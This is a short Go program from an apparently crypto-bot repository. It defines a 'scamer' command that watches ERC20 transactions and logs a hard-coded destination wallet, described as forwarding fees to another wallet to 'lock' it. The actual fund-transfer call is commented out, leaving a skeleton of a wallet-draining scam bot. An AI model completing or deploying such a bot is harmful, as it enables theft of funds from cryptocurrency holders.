package main

import (
	"log"

	"github.com/loic-roux-404/crypto-bots/cmd/bot/template"
	"github.com/loic-roux-404/crypto-bots/internal/model/kecacc"
	"github.com/loic-roux-404/crypto-bots/pkg/networks"
	"github.com/spf13/cobra"
)

func init() {
	template.InitNetCmd(&cobra.Command{
		Use:   "scamer",
		Short: "Scamer bot forwarding fees to another wallet",
	})
}

// Lock wallet by transfering fees on other wallet
func main() {
	template.ExecuteNetCmd()

	n := networks.GetNetwork("erc20")
	dest := "0xBe20D507fbdD6dAFd7a2ddE95c2d3f4618547F17"

	n.SubscribeCurrent().RunEventLoop(func(tx *kecacc.Tx) {
		log.Printf("Info: Forwarding fee to %s", dest)
		log.Printf("%s", tx.Data)
		// n.Send(dest, big.NewFloat(0.02))
	})
}
